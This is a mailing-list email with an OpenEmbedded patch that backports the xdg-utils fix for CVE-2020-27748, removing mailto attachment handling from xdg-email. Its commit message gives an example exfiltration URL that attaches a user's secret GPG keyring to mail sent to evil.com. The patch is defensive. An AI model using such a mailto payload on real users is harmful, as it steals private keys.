Received: from mga02.intel.com (mga02.intel.com [134.134.136.20])
 by mx.groups.io with SMTP id smtpd.web09.32582.1630998136647915212
 for <openembedded-core@lists.openembedded.org>;
 Tue, 07 Sep 2021 00:02:29 -0700
Authentication-Results: mx.groups.io;
 dkim=missing; spf=pass (domain: intel.com, ip: 134.134.136.20, mailfrom: anuj.mittal@intel.com)
X-IronPort-AV: E=McAfee;i="6200,9189,10099"; a="207344571"
X-IronPort-AV: E=Sophos;i="5.85,274,1624345200"; 
   d="scan'208";a="207344571"
Received: from fmsmga003.fm.intel.com ([10.253.24.29])
  by orsmga101.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 07 Sep 2021 00:02:29 -0700
X-IronPort-AV: E=Sophos;i="5.85,274,1624345200"; 
   d="scan'208";a="537804592"
Received: from tengjieg-mobl.gar.corp.intel.com (HELO anmitta2-mobl1.gar.corp.intel.com) ([10.213.137.164])
  by fmsmga003-auth.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 07 Sep 2021 00:02:28 -0700
From: "Anuj Mittal" <anuj.mittal@intel.com>
To: openembedded-core@lists.openembedded.org
Subject: [hardknott][PATCH 11/11] xdg-utils: Add fix for CVE-2020-27748
Date: Tue,  7 Sep 2021 15:02:07 +0800
Message-Id: <850dcfad6cf31488b44a7502931787063d0679b0.1630997270.git.anuj.mittal@intel.com>
X-Mailer: git-send-email 2.31.1
In-Reply-To: <cover.1630997270.git.anuj.mittal@intel.com>
References: <cover.1630997270.git.anuj.mittal@intel.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

From: Richard Purdie <richard.purdie@linuxfoundation.org>

Backport an upstream patch for the CVE.

Signed-off-by: Richard Purdie <richard.purdie@linuxfoundation.org>
(cherry picked from commit 87191ed0303f6552865ad1edcacd674c57f2010c)
Signed-off-by: Anuj Mittal <anuj.mittal@intel.com>
---
 ...9813e0eb0246f63b54e9e154970e609575af.patch | 58 +++++++++++++++++++
 .../xdg-utils/xdg-utils_1.1.3.bb              |  1 +
 2 files changed, 59 insertions(+)
 create mode 100644 meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch

diff --git a/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
new file mode 100644
index 0000000000..948b9e22e9
--- /dev/null
+++ b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
@@ -0,0 +1,58 @@
+From 1f199813e0eb0246f63b54e9e154970e609575af Mon Sep 17 00:00:00 2001
+From: =?UTF-8?q?J=C3=B6rg=20Thalheim?= <joerg@thalheim.io>
+Date: Tue, 18 Aug 2020 16:52:24 +0100
+Subject: [PATCH] xdg-email: remove attachment handling from mailto
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+This allows attacker to extract secrets from users:
+
+mailto:sid@evil.com?attach=/.gnupg/secring.gpg
+
+See also https://bugzilla.mozilla.org/show_bug.cgi?id=1613425
+and https://gitlab.freedesktop.org/xdg/xdg-utils/-/issues/177
+
+Signed-off-by: Jörg Thalheim <joerg@thalheim.io>
+---
+ scripts/xdg-email.in | 7 +------
+ 1 file changed, 1 insertion(+), 6 deletions(-)
+
+Upstream-Status: Backport
+CVE: CVE-2020-27748
+
+diff --git a/scripts/xdg-email.in b/scripts/xdg-email.in
+index 6db58ad..5d2f4f3 100644
+--- a/scripts/xdg-email.in
++++ b/scripts/xdg-email.in
+@@ -32,7 +32,7 @@ _USAGE
+ 
+ run_thunderbird()
+ {
+-    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
++    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
+     THUNDERBIRD="$1"
+     MAILTO=$(echo "$2" | sed 's/^mailto://')
+     echo "$MAILTO" | grep -qs "^?"
+@@ -48,7 +48,6 @@ run_thunderbird()
+     BCC=$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=' | sed 's/^bcc=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
+     SUBJECT=$(echo "$MAILTO" | grep '^subject=' | tail -n 1)
+     BODY=$(echo "$MAILTO" | grep '^body=' | tail -n 1)
+-    ATTACH=$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=' | sed 's/^attach=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,$//'))
+ 
+     if [ -z "$TO" ] ; then
+         NEWMAILTO=
+@@ -68,10 +67,6 @@ run_thunderbird()
+         NEWMAILTO="${NEWMAILTO},$BODY"
+     fi
+ 
+-    if [ -n "$ATTACH" ] ; then
+-        NEWMAILTO="${NEWMAILTO},attachment='${ATTACH}'"
+-    fi
+-
+     NEWMAILTO=$(echo "$NEWMAILTO" | sed 's/^,//')
+     DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
+     "$THUNDERBIRD" -compose "$NEWMAILTO"
+-- 
+GitLab
+
diff --git a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
index d371c5c28c..41b74b8598 100644
--- a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
+++ b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
@@ -20,6 +20,7 @@ LIC_FILES_CHKSUM = "file://LICENSE;md5=a5367a90934098d6b05af3b746405014"
 SRC_URI = "https://portland.freedesktop.org/download/${BPN}-${PV}.tar.gz \
            file://0001-Reinstate-xdg-terminal.patch \
            file://0001-Don-t-build-the-in-script-manual.patch \
+           file://1f199813e0eb0246f63b54e9e154970e609575af.patch \
           "
 
 SRC_URI[md5sum] = "902042508b626027a3709d105f0b63ff"
-- 
2.31.1

